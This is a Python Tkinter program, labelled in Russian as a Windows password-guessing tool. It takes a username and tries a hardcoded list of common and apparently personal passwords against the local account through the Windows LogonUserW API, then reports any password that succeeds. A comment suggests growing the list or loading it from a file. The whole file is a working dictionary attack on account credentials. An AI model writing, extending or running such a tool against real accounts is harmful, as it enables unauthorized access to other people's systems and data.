import ctypes
import tkinter as tk
from tkinter import messagebox

def check_password(username, password):
    LOGON32_LOGON_INTERACTIVE = 2
    LOGON32_PROVIDER_DEFAULT = 0

    token = ctypes.c_void_p()

    result = ctypes.windll.advapi32.LogonUserW(
        username,
        None,
        password,
        LOGON32_LOGON_INTERACTIVE,
        LOGON32_PROVIDER_DEFAULT,
        ctypes.byref(token)
    )

    if result != 0:
        ctypes.windll.kernel32.CloseHandle(token)
        return True
    else:
        return False

def start_password_check():
    username = entry_username.get().strip()
    if not username:
        messagebox.showwarning("Ошибка", "Введите имя пользователя")
        return

    # Здесь можно расширить список паролей, либо загрузить из файла
    password_list = ["1234", "password", "admin123", "correct_password", "PavelBoikov14881337",'password',
                    '123456','123456789','guest','qwerty','12345678','111111','12345','col123456','123123','1','0hrAnA']

    label_result.config(text="Подбор пароля начат...")
    root.update_idletasks()  # Обновляем интерфейс

    for pwd in password_list:
        label_result.config(text=f"Проверка пароля: {pwd} ...")
        root.update_idletasks()

        if check_password(username, pwd):
            label_result.config(text=f"Пароль найден: {pwd}")
            return

    label_result.config(text="Пароль не найден в данном списке")

# Создание главного окна
root = tk.Tk()
root.title("Подбор пароля Windows")

# Метка и поле ввода для логина
tk.Label(root, text="Имя пользователя:").pack(pady=(10, 0))
entry_username = tk.Entry(root, width=30)
entry_username.pack(pady=(0, 10))

# Кнопка запуска подбора пароля
btn_start = tk.Button(root, text="Начать подбор пароля", command=start_password_check)
btn_start.pack(pady=10)

# Метка для вывода результата
label_result = tk.Label(root, text="", fg="blue")
label_result.pack(pady=(10, 20))

root.geometry("300x180")
root.mainloop()
    